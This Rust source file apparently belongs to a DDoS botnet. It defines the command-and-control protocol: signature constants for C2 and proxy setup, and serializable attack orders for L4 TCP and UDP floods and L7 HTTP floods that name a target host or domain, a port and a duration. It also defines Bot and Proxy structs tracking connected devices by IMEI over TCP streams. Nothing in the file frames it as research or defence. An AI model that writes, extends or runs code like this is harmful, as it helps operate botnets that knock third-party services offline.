pub mod ddos_frequency {
    use serde::{Deserialize, Serialize};
    pub const L4_TCP_SIG: u32 = 0x1d319dc5;
    pub const L7_HTTP_SIG: u32 = 0x1d319dc6;
    pub const L4_UDP_SIG: u32 = 0x1d319dc7;
    #[derive(Debug)]
    #[derive(Serialize, Deserialize)]
    pub struct L4_TCP {
        pub host: String,
        pub port: u32,
        pub duration: u32,
    }
    #[derive(Debug)]
    #[derive(Serialize, Deserialize)]
    pub struct L4 {
        pub host: String,
        pub port: u32,
        pub duration: u32,
    }
    #[derive(Debug)]
    #[derive(Serialize, Deserialize)]
    pub struct L7_HTTP {
        pub domain: String,
        pub port: u32,
        pub duration: u32,
    }
}
pub mod common_frequency {
    use serde::{Deserialize, Serialize};
    use std::net::TcpStream;
    pub const SET_AIR_SIG: u32 = 0xd5c5d485;
    pub const PROXY_INIT_SIG: u32 = 0x687ea868;
    pub const C2_INIT_SIG: u32 = 0x687ea869;
    pub const WAIT_OK_SIG: u32 = 0x01;
    #[derive(Debug)]
    #[derive(Serialize, Deserialize)]
    pub struct Message {
        pub imei: u64,
        pub shellcode: u32,
    }

    #[derive(Debug)]
    pub struct Bot {
        pub imei: u64,
        pub peer: String,
        pub stream: TcpStream,
    }
    #[derive(Debug)]
    pub struct Proxy {
        pub imei: u64,
        pub stream: TcpStream,
    }

}
